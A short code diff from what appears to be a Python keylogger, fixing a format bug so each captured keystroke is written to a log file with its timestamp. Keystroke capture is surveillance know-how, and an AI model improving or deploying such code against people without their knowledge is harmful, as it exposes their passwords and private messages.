@@ -8,7 +8,7 @@ def key_pressed(key):
         try:
             char = key.char
             timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-            logKey.write(f'{timestamp} - char + \n')
+            logKey.write(f'{timestamp} - {char}\n')
         except AttributeError:
             #log special keys( e.g., Shift, Ctrl, etc.)
             timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
